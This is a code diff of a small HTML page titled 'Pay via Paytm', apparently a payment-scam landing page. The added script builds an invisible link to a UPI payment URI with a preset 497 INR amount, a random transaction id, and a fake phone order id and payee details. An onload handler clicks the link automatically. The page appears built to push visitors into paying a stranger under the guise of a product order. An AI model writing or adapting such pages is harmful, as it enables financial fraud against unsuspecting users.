@@ -4,7 +4,7 @@
 
 <meta http-equiv="content-type" content="text/html;charset=utf-8" />
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
-<title> Pay via other UPI apps </title>
+<title> Pay via Paytm </title>
 
 </head>
  
@@ -13,8 +13,30 @@
 <body>
 <h1 id="vid" class="karan">cool-cash-looto567</h1>
 
-<a href="upi://pay?pa=fcbizazkzxt@freecharge&amp;pn=Paytm&amp;tn=Redmi Note 9Pr0&amp;am=&amp;mode=02&amp;cu=INR&amp;tr=GHP51795841" id="linkid">
-</a>
+<script>
+function makeid(length) {
+let result = '';
+const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+const charactersLength = characters.length;
+let counter = 0;
+while (counter < length) {
+result += characters.charAt(Math.floor(Math.random() * charactersLength));
+counter += 1;
+}
+return result;
+}
+console.log(makeid(10));
+
+var a = document.createElement('a');
+var linkText = document.createTextNode('Redirection');
+a.appendChild(linkText);
+a.id='linkid';
+a.style='visibility: hidden; opacity: 0;';
+a.rel='noopener noreferrer nofollow';
+a.title='Redirection';
+a.href='upi://pay?pa=online-payment@sbi&pn=Mr.%20Sumit%20Kumar%20Suman&mc=7311&tr=' + makeid(180) + '&tn=Redmi%2012%205G%20Pastel%20Blue%20|%20ORDER%20ID%20=%20FP8744GCD6&am=497&cu=INR&url=&mode=02&purpose=00&orgid=159002&sign=MEYCIQCke8kk08w+KkZnYNLUUrwqNCFLSiD/Ruao9t4j/MUgjwIhAJZKnG05J7B//h+16TB56+7B0ZSJAQDvPSw75vNGAQIX';
+document.body.appendChild(a);
+</script>
 
 <script type="text/javascript">window.onload=function(){document.getElementById("linkid").click()}</script>
 
